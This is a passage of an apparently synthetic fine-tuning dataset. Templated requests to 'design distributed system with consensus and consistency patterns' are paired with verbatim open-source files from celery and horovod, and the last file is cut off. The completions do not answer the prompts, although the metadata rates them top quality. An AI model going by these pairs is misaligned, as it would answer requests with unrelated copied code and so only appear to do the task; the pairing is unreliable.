**kwargs)\n            finally:\n                if clear_after:\n                    self._clear()\n\n    def clear_tasks(self, ready=True):\n        with self._mutex:\n            return self._clear_tasks(ready)\n\n    def _clear_tasks(self, ready: bool = True):\n        if ready:\n            in_progress = {\n                uuid: task for uuid, task in self.itertasks()\n                if task.state not in states.READY_STATES\n            }\n            self.tasks.clear()\n            self.tasks.update(in_progress)\n        else:\n            self.tasks.clear()\n        self._taskheap[:] = []\n\n    def _clear(self, ready=True):\n        self.workers.clear()\n        self._clear_tasks(ready)\n        self.event_count = 0\n        self.task_count = 0\n\n    def clear(self, ready: bool = True):\n        with self._mutex:\n            return self._clear(ready)\n\n    def get_or_create_worker(self, hostname, **kwargs):\n        \"\"\"Get or create worker by hostname.\n\n        Returns:\n            Tuple: of ``(worker, was_created)`` pairs.\n        \"\"\"\n        try:\n            worker = self.workers[hostname]\n            if kwargs:\n                worker.update(kwargs)\n            return worker, False\n        except KeyError:\n            worker = self.workers[hostname] = self.Worker(\n                hostname, **kwargs)\n            return worker, True\n\n    def get_or_create_task(self, uuid):\n        \"\"\"Get or create task by uuid.\"\"\"\n        try:\n            return self.tasks[uuid], False\n        except KeyError:\n            task = self.tasks[uuid] = self.Task(uuid, cluster_state=self)\n            return task, True\n\n    def event(self, event):\n        with self._mutex:\n            return self._event(event)\n\n    def task_event(self, type_, fields):\n        \"\"\"Deprecated, use :meth:`event`.\"\"\"\n        return self._event(dict(fields, type='-'.join(['task', type_])))[0]\n\n    def worker_event(self, type_, fields):\n        \"\"\"Deprecated, use :meth:`event`.\"\"\"\n        return self._event(dict(fields, type='-'.join(['worker', type_])))[0]\n\n    def _create_dispatcher(self):\n\n        # pylint: disable=too-many-statements\n        # This code is highly optimized, but not for reusability.\n        get_handler = self.handlers.__getitem__\n        event_callback = self.event_callback\n        wfields = itemgetter('hostname', 'timestamp', 'local_received')\n        tfields = itemgetter('uuid', 'hostname', 'timestamp',\n                             'local_received', 'clock')\n        taskheap = self._taskheap\n        th_append = taskheap.append\n        th_pop = taskheap.pop\n        # Removing events from task heap is an O(n) operation,\n        # so easier to just account for the common number of events\n        # for each task (PENDING->RECEIVED->STARTED->final)\n        #: an O(n) operation\n        max_events_in_heap = self.max_tasks_in_memory * self.heap_multiplier\n        add_type = self._seen_types.add\n        on_node_join, on_node_leave = self.on_node_join, self.on_node_leave\n        tasks, Task = self.tasks, self.Task\n        workers, Worker = self.workers, self.Worker\n        # avoid updating LRU entry at getitem\n        get_worker, get_task = workers.data.__getitem__, tasks.data.__getitem__\n\n        get_task_by_type_set = self.tasks_by_type.__getitem__\n        get_task_by_worker_set = self.tasks_by_worker.__getitem__\n\n        def _event(event,\n                   timetuple=timetuple, KeyError=KeyError,\n                   insort=bisect.insort, created=True):\n            self.event_count += 1\n            if event_callback:\n                event_callback(self, event)\n            group, _, subject = event['type'].partition('-')\n            try:\n                handler = get_handler(group)\n            except KeyError:\n                pass\n            else:\n                return handler(subject, event), subject\n\n            if group == 'worker':\n                try:\n                    hostname, timestamp, local_received = wfields(event)\n                except KeyError:\n                    pass\n                else:\n                    is_offline = subject == 'offline'\n                    try:\n                        worker, created = get_worker(hostname), False\n                    except KeyError:\n                        if is_offline:\n                            worker, created = Worker(hostname), False\n                        else:\n                            worker = workers[hostname] = Worker(hostname)\n                    worker.event(subject, timestamp, local_received, event)\n                    if on_node_join and (created or subject == 'online'):\n                        on_node_join(worker)\n                    if on_node_leave and is_offline:\n                        on_node_leave(worker)\n                        workers.pop(hostname, None)\n                    return (worker, created), subject\n            elif group == 'task':\n                (uuid, hostname, timestamp,\n                 local_received, clock) = tfields(event)\n                # task-sent event is sent by client, not worker\n                is_client_event = subject == 'sent'\n                try:\n                    task, task_created = get_task(uuid), False\n                except KeyError:\n                    task = tasks[uuid] = Task(uuid, cluster_state=self)\n                    task_created = True\n                if is_client_event:\n                    task.client = hostname\n                else:\n                    try:\n                        worker = get_worker(hostname)\n                    except KeyError:\n                        worker = workers[hostname] = Worker(hostname)\n                    task.worker = worker\n                    if worker is not None and local_received:\n                        worker.event(None, local_received, timestamp)\n\n                origin = hostname if is_client_event else worker.id\n\n                # remove oldest event if exceeding the limit.\n                heaps = len(taskheap)\n                if heaps + 1 > max_events_in_heap:\n                    th_pop(0)\n\n                # most events will be dated later than the previous.\n                timetup = timetuple(clock, timestamp, origin, ref(task))\n                if heaps and timetup > taskheap[-1]:\n                    th_append(timetup)\n                else:\n                    insort(taskheap, timetup)\n\n                if subject == 'received':\n                    self.task_count += 1\n                task.event(subject, timestamp, local_received, event)\n                task_name = task.name\n                if task_name is not None:\n                    add_type(task_name)\n                    if task_created:  # add to tasks_by_type index\n                        get_task_by_type_set(task_name).add(task)\n                        get_task_by_worker_set(hostname).add(task)\n                if task.parent_id:\n                    try:\n                        parent_task = self.tasks[task.parent_id]\n                    except KeyError:\n                        self._add_pending_task_child(task)\n                    else:\n                        parent_task.children.add(task)\n                try:\n                    _children = self._tasks_to_resolve.pop(uuid)\n                except KeyError:\n                    pass\n                else:\n                    task.children.update(_children)\n\n                return (task, task_created), subject\n        return _event\n\n    def _add_pending_task_child(self, task):\n        try:\n            ch = self._tasks_to_resolve[task.parent_id]\n        except KeyError:\n            ch = self._tasks_to_resolve[task.parent_id] = WeakSet()\n        ch.add(task)\n\n    def rebuild_taskheap(self, timetuple=timetuple):\n        heap = self._taskheap[:] = [\n            timetuple(t.clock, t.timestamp, t.origin, ref(t))\n            for t in self.tasks.values()\n        ]\n        heap.sort()\n\n    def itertasks(self, limit: Optional[int] = None):\n        for index, row in enumerate(self.tasks.items()):\n            yield row\n            if limit and index + 1 >= limit:\n                break\n\n    def tasks_by_time(self, limit=None, reverse: bool = True):\n        \"\"\"Generator yielding tasks ordered by time.\n\n        Yields:\n            Tuples of ``(uuid, Task)``.\n        \"\"\"\n        _heap = self._taskheap\n        if reverse:\n            _heap = reversed(_heap)\n\n        seen = set()\n        for evtup in islice(_heap, 0, limit):\n            task = evtup[3]()\n            if task is not None:\n                uuid = task.uuid\n                if uuid not in seen:\n                    yield uuid, task\n                    seen.add(uuid)\n    tasks_by_timestamp = tasks_by_time\n\n    def _tasks_by_type(self, name, limit=None, reverse=True):\n        \"\"\"Get all tasks by type.\n\n        This is slower than accessing :attr:`tasks_by_type`,\n        but will be ordered by time.\n\n        Returns:\n            Generator: giving ``(uuid, Task)`` pairs.\n        \"\"\"\n        return islice(\n            ((uuid, task) for uuid, task in self.tasks_by_time(reverse=reverse)\n             if task.name == name),\n            0, limit,\n        )\n\n    def _tasks_by_worker(self, hostname, limit=None, reverse=True):\n        \"\"\"Get all tasks by worker.\n\n        Slower than accessing :attr:`tasks_by_worker`, but ordered by time.\n        \"\"\"\n        return islice(\n            ((uuid, task) for uuid, task in self.tasks_by_time(reverse=reverse)\n             if task.worker.hostname == hostname),\n            0, limit,\n        )\n\n    def task_types(self):\n        \"\"\"Return a list of all seen task types.\"\"\"\n        return sorted(self._seen_types)\n\n    def alive_workers(self):\n        \"\"\"Return a list of (seemingly) alive workers.\"\"\"\n        return (w for w in self.workers.values() if w.alive)\n\n    def __repr__(self):\n        return R_STATE.format(self)\n\n    def __reduce__(self):\n        return self.__class__, (\n            self.event_callback, self.workers, self.tasks, None,\n            self.max_workers_in_memory, self.max_tasks_in_memory,\n            self.on_node_join, self.on_node_leave,\n            _serialize_Task_WeakSet_Mapping(self.tasks_by_type),\n            _serialize_Task_WeakSet_Mapping(self.tasks_by_worker),\n        )\n\n\ndef _serialize_Task_WeakSet_Mapping(mapping):\n    return {name: [t.id for t in tasks] for name, tasks in mapping.items()}\n\n\ndef _deserialize_Task_WeakSet_Mapping(mapping, tasks):\n    mapping = mapping or {}\n    return {name: WeakSet(tasks[i] for i in ids if i in tasks)\n            for name, ids in mapping.items()}\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/events/state.py", "language": "python", "complexity": "complex", "star_count": 26879, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 731}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Loader base class.\"\"\"\nimport importlib\nimport os\nimport re\nimport sys\nfrom datetime import datetime, timezone\n\nfrom kombu.utils import json\nfrom kombu.utils.objects import cached_property\n\nfrom celery import signals\nfrom celery.exceptions import reraise\nfrom celery.utils.collections import DictAttribute, force_mapping\nfrom celery.utils.functional import maybe_list\nfrom celery.utils.imports import NotAPackage, find_module, import_from_cwd, symbol_by_name\n\n__all__ = ('BaseLoader',)\n\n_RACE_PROTECTION = False\n\nCONFIG_INVALID_NAME = \"\"\"\\\nError: Module '{module}' doesn't exist, or it's not a valid \\\nPython module name.\n\"\"\"\n\nCONFIG_WITH_SUFFIX = CONFIG_INVALID_NAME + \"\"\"\\\nDid you mean '{suggest}'?\n\"\"\"\n\nunconfigured = object()\n\n\nclass BaseLoader:\n    \"\"\"Base class for loaders.\n\n    Loaders handles,\n\n        * Reading celery client/worker configurations.\n\n        * What happens when a task starts?\n            See :meth:`on_task_init`.\n\n        * What happens when the worker starts?\n            See :meth:`on_worker_init`.\n\n        * What happens when the worker shuts down?\n            See :meth:`on_worker_shutdown`.\n\n        * What modules are imported to find tasks?\n    \"\"\"\n\n    builtin_modules = frozenset()\n    configured = False\n    override_backends = {}\n    worker_initialized = False\n\n    _conf = unconfigured\n\n    def __init__(self, app, **kwargs):\n        self.app = app\n        self.task_modules = set()\n\n    def now(self, utc=True):\n        if utc:\n            return datetime.now(timezone.utc)\n        return datetime.now()\n\n    def on_task_init(self, task_id, task):\n        \"\"\"Called before a task is executed.\"\"\"\n\n    def on_process_cleanup(self):\n        \"\"\"Called after a task is executed.\"\"\"\n\n    def on_worker_init(self):\n        \"\"\"Called when the worker (:program:`celery worker`) starts.\"\"\"\n\n    def on_worker_shutdown(self):\n        \"\"\"Called when the worker (:program:`celery worker`) shuts down.\"\"\"\n\n    def on_worker_process_init(self):\n        \"\"\"Called when a child process starts.\"\"\"\n\n    def import_task_module(self, module):\n        self.task_modules.add(module)\n        return self.import_from_cwd(module)\n\n    def import_module(self, module, package=None):\n        return importlib.import_module(module, package=package)\n\n    def import_from_cwd(self, module, imp=None, package=None):\n        return import_from_cwd(\n            module,\n            self.import_module if imp is None else imp,\n            package=package,\n        )\n\n    def import_default_modules(self):\n        responses = signals.import_modules.send(sender=self.app)\n        # Prior to this point loggers are not yet set up properly, need to\n        #   check responses manually and reraised exceptions if any, otherwise\n        #   they'll be silenced, making it incredibly difficult to debug.\n        for _, response in responses:\n            if isinstance(response, Exception):\n                raise response\n        return [self.import_task_module(m) for m in self.default_modules]\n\n    def init_worker(self):\n        if not self.worker_initialized:\n            self.worker_initialized = True\n            self.import_default_modules()\n            self.on_worker_init()\n\n    def shutdown_worker(self):\n        self.on_worker_shutdown()\n\n    def init_worker_process(self):\n        self.on_worker_process_init()\n\n    def config_from_object(self, obj, silent=False):\n        if isinstance(obj, str):\n            try:\n                obj = self._smart_import(obj, imp=self.import_from_cwd)\n            except (ImportError, AttributeError):\n                if silent:\n                    return False\n                raise\n        self._conf = force_mapping(obj)\n        if self._conf.get('override_backends') is not None:\n            self.override_backends = self._conf['override_backends']\n        return True\n\n    def _smart_import(self, path, imp=None):\n        imp = self.import_module if imp is None else imp\n        if ':' in path:\n            # Path includes attribute so can just jump\n            # here (e.g., ``os.path:abspath``).\n            return symbol_by_name(path, imp=imp)\n\n        # Not sure if path is just a module name or if it includes an\n        # attribute name (e.g., ``os.path``, vs, ``os.path.abspath``).\n        try:\n            return imp(path)\n        except ImportError:\n            # Not a module name, so try module + attribute.\n            return symbol_by_name(path, imp=imp)\n\n    def _import_config_module(self, name):\n        try:\n            self.find_module(name)\n        except NotAPackage as exc:\n            if name.endswith('.py'):\n                reraise(NotAPackage, NotAPackage(CONFIG_WITH_SUFFIX.format(\n                        module=name, suggest=name[:-3])), sys.exc_info()[2])\n            raise NotAPackage(CONFIG_INVALID_NAME.format(module=name)) from exc\n        else:\n            return self.import_from_cwd(name)\n\n    def find_module(self, module):\n        return find_module(module)\n\n    def cmdline_config_parser(self, args, namespace='celery',\n                              re_type=re.compile(r'\\((\\w+)\\)'),\n                              extra_types=None,\n                              override_types=None):\n        extra_types = extra_types if extra_types else {'json': json.loads}\n        override_types = override_types if override_types else {\n            'tuple': 'json',\n            'list': 'json',\n            'dict': 'json'\n        }\n        from celery.app.defaults import NAMESPACES, Option\n        namespace = namespace and namespace.lower()\n        typemap = dict(Option.typemap, **extra_types)\n\n        def getarg(arg):\n            \"\"\"Parse single configuration from command-line.\"\"\"\n            # ## find key/value\n            # ns.key=value|ns_key=value (case insensitive)\n            key, value = arg.split('=', 1)\n            key = key.lower().replace('.', '_')\n\n            # ## find name-space.\n            # .key=value|_key=value expands to default name-space.\n            if key[0] == '_':\n                ns, key = namespace, key[1:]\n            else:\n                # find name-space part of key\n                ns, key = key.split('_', 1)\n\n            ns_key = (ns and ns + '_' or '') + key\n\n            # (type)value makes cast to custom type.\n            cast = re_type.match(value)\n            if cast:\n                type_ = cast.groups()[0]\n                type_ = override_types.get(type_, type_)\n                value = value[len(cast.group()):]\n                value = typemap[type_](value)\n            else:\n                try:\n                    value = NAMESPACES[ns.lower()][key].to_python(value)\n                except ValueError as exc:\n                    # display key name in error message.\n                    raise ValueError(f'{ns_key!r}: {exc}')\n            return ns_key, value\n        return dict(getarg(arg) for arg in args)\n\n    def read_configuration(self, env='CELERY_CONFIG_MODULE'):\n        try:\n            custom_config = os.environ[env]\n        except KeyError:\n            pass\n        else:\n            if custom_config:\n                usercfg = self._import_config_module(custom_config)\n                return DictAttribute(usercfg)\n\n    def autodiscover_tasks(self, packages, related_name='tasks'):\n        self.task_modules.update(\n            mod.__name__ for mod in autodiscover_tasks(packages or (),\n                                                       related_name) if mod)\n\n    @cached_property\n    def default_modules(self):\n        return (\n            tuple(self.builtin_modules) +\n            tuple(maybe_list(self.app.conf.imports)) +\n            tuple(maybe_list(self.app.conf.include))\n        )\n\n    @property\n    def conf(self):\n        \"\"\"Loader configuration.\"\"\"\n        if self._conf is unconfigured:\n            self._conf = self.read_configuration()\n        return self._conf\n\n\ndef autodiscover_tasks(packages, related_name='tasks'):\n    global _RACE_PROTECTION\n\n    if _RACE_PROTECTION:\n        return ()\n    _RACE_PROTECTION = True\n    try:\n        return [find_related_module(pkg, related_name) for pkg in packages]\n    finally:\n        _RACE_PROTECTION = False\n\n\ndef find_related_module(package, related_name):\n    \"\"\"Find module in package.\"\"\"\n    # Django 1.7 allows for specifying a class name in INSTALLED_APPS.\n    # (Issue #2248).\n    try:\n        # Return package itself when no related_name.\n        module = importlib.import_module(package)\n        if not related_name and module:\n            return module\n    except ModuleNotFoundError:\n        # On import error, try to walk package up one level.\n        package, _, _ = package.rpartition('.')\n        if not package:\n            raise\n\n    module_name = f'{package}.{related_name}'\n\n    try:\n        # Try to find related_name under package.\n        return importlib.import_module(module_name)\n    except ModuleNotFoundError as e:\n        import_exc_name = getattr(e, 'name', None)\n        # If candidate does not exist, then return None.\n        if import_exc_name and module_name == import_exc_name:\n            return\n\n        # Otherwise, raise because error probably originated from a nested import.\n        raise e\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/loaders/base.py", "language": "python", "complexity": "complex", "star_count": 26879, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 279}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2021 Uber Technologies, Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\nimport re\nfrom typing import List, Dict, Set\n\nimport yaml\nfrom yaml import Loader\n\n\ndef main():\n    import subprocess\n    import pathlib\n    from collections import Counter, defaultdict\n\n    # run gen-pipeline.sh to get full Buildkite pipeline\n    path = pathlib.Path(__file__).parent\n    script = path.joinpath('..', '.buildkite', 'gen-pipeline.sh').absolute()\n    env = dict(\n        PIPELINE_MODE='FULL',\n        BUILDKITE_PIPELINE_SLUG='horovod',\n        BUILDKITE_PIPELINE_DEFAULT_BRANCH='master',\n        BUILDKITE_BRANCH='master'\n    )\n    proc = subprocess.run([script], env=env, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, encoding='utf-8')\n    if proc.returncode:\n        raise RuntimeError(f'Script exited with code {proc.returncode}: {script}')\n\n    # parse the pipeline\n    pipeline = yaml.load(proc.stdout, Loader=Loader)\n    steps = pipeline.get('steps', [])\n\n    docker_compose_plugins = {plugin_name\n                              for step in steps if isinstance(step, dict) and 'label' in step\n                              and step['label'].startswith(':docker: Build ')\n                              for plugins in step['plugins']\n                              for plugin_name in plugins.keys() if plugin_name.startswith('docker-compose#')}\n    if len(docker_compose_plugins) == 0:\n        raise RuntimeError('No docker-compose plugin found')\n    if len(docker_compose_plugins) > 1:\n        raise RuntimeError('Multiple docker-compose plugins found')\n\n    docker_compose_plugin = list(docker_compose_plugins)[0]\n    images = [plugin[docker_compose_plugin]['build']\n              for step in steps if isinstance(step, dict) and 'label' in step\n                                and step['label'].startswith(':docker: Build ')\n              for plugin in step['plugins'] if docker_compose_plugin in plugin]\n\n    cpu_tests = [(re.sub(r' \\(test-.*', '', re.sub(':[^:]*: ', '', step['label'])),\n                  step['command'],\n                  step['timeout_in_minutes'],\n                  plugin[docker_compose_plugin]['run'])\n                 for step in steps if isinstance(step, dict) and 'label' in step and 'command' in step\n                 and not step['label'].startswith(':docker: Build ') and '-cpu-' in step['label']\n                 for plugin in step['plugins'] if docker_compose_plugin in plugin]\n\n    # we need to distinguish the two oneccl variants of some tests\n    cpu_tests = [(label + (' [ONECCL OFI]' if 'mpirun_command_ofi' in command else (' [ONECCL MPI]' if 'mpirun_command_mpi' in command else '')),\n                  command,\n                  timeout,\n                  image)\n                 for label, command, timeout, image in cpu_tests]\n\n    # check that labels are unique per image\n    cardinalities = Counter([(label, image) for label, command, timeout, image in cpu_tests])\n    conflicts = [(label, image, card) for (label, image), card in cardinalities.items() if card > 1]\n    if conflicts:\n        summary = '\\n'.join([f'\"{label}\" for image \"{image}\"' for label, image, card in conflicts])\n        raise RuntimeError(f'There are {len(conflicts)} duplicate test labels for images:\\n{summary}')\n\n    # commands for some labels may differ\n    # we make their labels unique here\n    label_commands = defaultdict(Counter)\n    for label, command, timeout, image in cpu_tests:\n        label_commands[label][command] += 1\n\n    labels_with_multiple_commands = {label: c for label, c in label_commands.items() if len(c) > 1}\n    new_labels_per_label_command = {(label, command): f'{label} {index+1}'\n                                    for label, commands in labels_with_multiple_commands.items()\n                                    for index, command in enumerate(commands)}\n\n    cpu_tests = [(new_labels_per_label_command[(label, command)] if (label, command) in new_labels_per_label_command else label,\n                  command,\n                  timeout,\n                  image)\n                 for label, command, timeout, image in cpu_tests]\n\n    # come up with test ids from test labels\n    test_labels = {label for label, command, timeout, image in cpu_tests}\n    test_id_per_label = [(label, re.sub('[^a-zA-Z0-9_]', '', re.sub('[ .]', '_', label)))\n                         for label in test_labels]\n    if len({id for label, id in test_id_per_label}) != len(test_labels):\n        raise RuntimeError('Some test ids are not unique')\n    test_id_per_label = dict(test_id_per_label)\n\n    # collect tests per image\n    tests_per_image = {image: {test_id_per_label[label]\n                               for label, command, timeout, test_image in cpu_tests\n                               if test_image == image}\n                       for image in sorted(images)}\n    # define no tests for any image (used for GPU builds below)\n    no_tests_per_image = defaultdict(lambda: set())\n\n    # index tests by id\n    tests = {test_id_per_label[label]: dict(label=label, command=command, timeout=timeout)\n             for label, command, timeout, image in cpu_tests}\n\n    def workflow_header() -> str:\n        return (f'# Do not edit this file! It has been generated by .github/gen-workflow-ci.py\\n'\n                f'\\n'\n                f'name: CI\\n'\n                f'\\n'\n                f'on:\\n'\n                f'  schedule:\\n'\n                f'    # run a build on master (this does not publish test results or cancel concurrent builds)\\n'\n                f'    - cron: \\'0 10 * * *\\' # everyday at 10am\\n'\n                f'  push:\\n'\n                f'    # only consider push to master, hotfix-branches, and tags\\n'\n                f'    # otherwise modify job.config.outputs.push\\n'\n                f'    branches: [ \\'master\\', \\'hotfix-*\\' ]\\n'\n                f'    tags: [ \\'v*.*.*\\' ]\\n'\n                f'  pull_request:\\n'\n                f'    # only consider pull requests into master\\n'\n                f'    branches: [ master ]\\n'\n                f'  workflow_dispatch:\\n'\n                f'\\n'\n                 'permissions: {}\\n'\n                f'\\n'\n                f'concurrency:\\n'\n                f'  # This controls which concurrent builds to cancel:\\n'\n                f'  # - we do not want any concurrent builds on a branch (pull_request)\\n'\n                f'  # - we do not want concurrent builds on the same commit on master (push)\\n'\n                f'  # - we do not want concurrent builds on the same commit on a tag (push)\\n'\n                f'  # - we allow concurrent runs on the same commit on master and its tag (push)\\n'\n                f'  # - we allow concurrent runs on the same commit on master (push) and a scheduled build (schedule)\\n'\n                f'  #\\n'\n                f'  # A pull_request event only runs on branch commit, a push event only on master and tag commit.\\n'\n                f'  # A schedule event only runs on master HEAD commit.\\n'\n                f'  #\\n'\n                f'  # Expression github.ref means something like refs/heads/master or refs/tags/v0.22.1 or the branch.\\n'\n                f'  # This helps to not cancel concurrent runs on master or a tag that share the same commit.\\n'\n                f'  # Expression github.head_ref refers to the branch of the pull request.\\n'\n                f'  # On master, github.head_ref is empty, so we use the SHA of the commit, this means individual\\n'\n                f'  # commits to master will not be cancelled, while there can only be one concurrent build on a branch.\\n'\n                f'  #\\n'\n                f'  # We include the event name to we allow for concurrent scheduled and master builds.\\n'\n                f'  group: ci-${{{{ github.event_name }}}}-${{{{ github.ref }}}}-${{{{ github.head_ref || github.sha }}}}\\n'\n                f'  cancel-in-progress: true\\n'\n                f'\\n')\n\n    def jobs(*jobs: str) -> str:\n        return 'jobs:\\n' \\\n               '  event_file:\\n' \\\n               '    name: \"Event File\"\\n' \\\n               '    runs-on: ubuntu-latest\\n' \\\n               '    steps:\\n' \\\n               '    - name: Upload\\n' \\\n               '      uses: actions/upload-artifact@v4\\n' \\\n               '      with:\\n' \\\n               '        name: Event File\\n' \\\n               '        path: ${{ github.event_path }}\\n' \\\n               '\\n' + \\\n               '  setup-py:\\n' \\\n               '    name: \"setup.py\"\\n' \\\n               '    runs-on: ubuntu-latest\\n' \\\n               '    steps:\\n' \\\n               '      - name: Checkout\\n' \\\n               '        uses: actions/checkout@v4\\n' \\\n               '      - name: Setup Python\\n' \\\n               '        uses: actions/setup-python@v5\\n' \\\n               '        with:\\n' \\\n               '          python-version: 3.8\\n' \\\n               '      - name: Test setup.py\\n' \\\n               '        env:\\n' \\\n               '          HOROVOD_WITHOUT_TENSORFLOW: 1\\n' \\\n               '          HOROVOD_WITHOUT_PYTORCH: 1\\n' \\\n               '          HOROVOD_WITHOUT_MXNET: 1\\n' \\\n               '          HOROVOD_WITHOUT_GLOO: 1\\n' \\\n               '          HOROVOD_WITHOUT_MPI: 1\\n' \\\n               '        run: |\\n' \\\n               '          python -m pip install --upgrade pip\\n' \\\n               '          python -m pip install setuptools wheel\\n' \\\n               '          python setup.py sdist\\n' \\\n               '          pip -v install dist/horovod-*.tar.gz\\n' \\\n               '\\n' + \\\n               '\\n'.join(jobs)\n\n    def init_workflow_job() -> str:\n        return (f'  init-workflow:\\n'\n                f'    name: \"Init Workflow\"\\n'\n                f'    runs-on: ubuntu-latest\\n'\n                f'    outputs:\\n'\n                f\"      run-at-all: ${{{{ github.event_name != 'schedule' || github.repository == 'horovod/horovod' }}}}\\n\"\n                f\"      # if we don't get a clear 'false', we fall back to building and testing\\n\"\n                f\"      run-builds-and-tests: ${{{{ steps.tests.outputs.needed != 'false' }}}}\\n\"\n                f'      buildkite-branch-label: \"${{{{ steps.config-buildkite.outputs.branch-label }}}}\"\\n'\n                f'      buildkite-message: \"${{{{ steps.config-buildkite.outputs.message }}}}\"\\n'\n                f'\\n'\n                f'    steps:\\n'\n                f'      - name: Checkout\\n'\n                f'        uses: actions/checkout@v4\\n'\n                f'      - name: Setup Python\\n'\n                f'        uses: actions/setup-python@v5\\n'\n                f'        with:\\n'\n                f'          python-version: 3.8\\n'\n                f'      - name: Pip install dependencies\\n'\n                f'        run: pip install -r .github/requirements.txt\\n'\n                f'\\n'\n                f'      - name: Check ci.yaml is up-to-date\\n'\n                f'        run: |\\n'\n                f'          python .github/gen-workflow-ci.py\\n'\n                f'          if [[ $(git diff .github/workflows/ci.yaml | wc -l) -gt 0 ]]\\n'\n                f'          then\\n'\n                f'            echo \"::error::Workflow file .github/workflows/ci.yaml is out-dated, please run .github/gen-workflow-ci.py and commit changes\"\\n'\n                f'            exit 1\\n'\n                f'          fi\\n'\n                f'        shell: bash\\n'\n                f'\\n'\n                f'      - name: Check if tests are needed\\n'\n                f'        id: tests\\n'\n                f'        env:\\n'\n                f'          GITHUB_BASE_SHA: ${{{{ github.event.pull_request.base.sha }}}}\\n'\n                f'          GITHUB_HEAD_SHA: ${{{{ github.event.pull_request.head.sha }}}}\\n'\n                f'        run: |\\n'\n                f'          if [[ \"${{{{ github.event_name }}}}\" == \"pull_request\" ]]\\n'\n                f'          then\\n'\n                f'            changes=\"$(python .github/get-changed-code-files.py)\"\\n'\n                f'            if [[ -z \"$changes\" ]]\\n'\n                f'            then\\n'\n                f'              echo \"No code changes, no need to build and test\"\\n'\n                f'              echo \"needed=false\" >> $GITHUB_OUTPUT\\n'\n                f'            else\\n'\n                f'              echo \"Code changes, we need to build and test:\"\\n'\n                f'              echo \"$changes\"\\n'\n                f'              echo \"needed=true\" >> $GITHUB_OUTPUT\\n'\n                f'            fi\\n'\n                f'          else\\n'\n                f'            echo \"This is not part of a pull request, we need to build and test\"\\n'\n                f'            echo \"needed=true\" >> $GITHUB_OUTPUT\\n'\n                f'          fi\\n'\n                f'\\n'\n                f'      - name: Configure Buildkite Build\\n'\n                f'        id: config-buildkite\\n'\n                f'        env:\\n'\n                f'          GITHUB_TOKEN: ${{{{ secrets.GITHUB_TOKEN }}}}\\n'\n                f'        run: |\\n'\n                f'          branch=\"${{{{ github.event.pull_request.head.ref || github.ref }}}}\"\\n'\n                f'          branch=\"${{branch#\"refs/heads/\"}}\"\\n'\n                f'          branch=\"${{branch#\"refs/tags/\"}}\"\\n'\n                f'\\n'\n                f'          branch_label=\"${{branch}}\"\\n'\n                f'          if [[ \"${{{{ github.event_name }}}}\" == \"schedule\" ]]\\n'\n                f'          then\\n'\n                f'            # we add this label to the branch used by Buildkite to avoid it cancelling one of concurrent schedule and push builds on master\\n'\n                f'            branch_label=\"${{branch}} (schedule)\"\\n'\n                f'          fi\\n'\n                f'          echo \"branch-label=${{branch_label}}\" >> $GITHUB_OUTPUT\\n'\n                f'\\n'\n                f'          if [[ \"${{{{ github.event_name }}}}\" == \"pull_request\" ]]\\n'\n                f'          then\\n'\n                f'            head_sha=\"${{{{ github.event.pull_request.head.sha }}}}\"\\n'\n                f'            message=\"$(gh api https://api.github.com/repos/horovod/horovod/commits/${{head_sha}} -q .commit.message | head -n1)\"\\n'\n                f'            echo \"message=${{message}}\" >> $GITHUB_OUTPUT\\n'\n                f'          fi\\n'\n                f'\\n'\n                f'      - name: Provide PR meta\\n'\n                f\"        if: github.event_name == 'pull_request'\\n\"\n                f'        run: |\\n'\n                f'          rm -f pr.json\\n'\n                f'          echo -n \"{{\" >> pr.json\\n'\n                f'          echo -n \" \\\\\\\"merge_sha\\\\\\\": \\\\\\\"${{{{ github.sha }}}}\\\\\\\",\" >> pr.json\\n'\n                f'          echo -n \" \\\\\\\"base_sha\\\\\\\": \\\\\\\"${{{{ github.event.pull_request.base.sha }}}}\\\\\\\",\" >> pr.json\\n'\n                f'          echo -n \" \\\\\\\"head_sha\\\\\\\": \\\\\\\"${{{{ github.event.pull_request.head.sha }}}}\\\\\\\" \" >> pr.json\\n'\n                f'          echo -n \"}}\" >> pr.json\\n'\n                f'          cat pr.json\\n'\n                f'\\n'\n                f'      - name: Upload PR meta\\n'\n                f'        uses: actions/upload-artifact@v4\\n'\n                f\"        if: github.event_name == 'pull_request'\\n\"\n                f'        with:\\n'\n                f'          name: PR Meta\\n'\n                f'          path: pr.json\\n'\n                f'\\n')\n\n    def build_and_test_images(id: str,\n                              name: str,\n                              needs: List[str],\n                              images: List[str],\n                              tests_per_image: Dict[str, Set[str]],\n                              tests: Dict[str, Dict],\n                              parallel_images: int = None,\n                              attempts: int = 3) -> str:\n        if 'init-workflow' not in needs:\n            needs.insert(0, 'init-workflow')\n        if parallel_images is None:\n          parallel_images = len(images)\n        failure = \"'failure'\"\n        return (f'  {id}:\\n'\n                f'    name: \"{name} (${{{{ 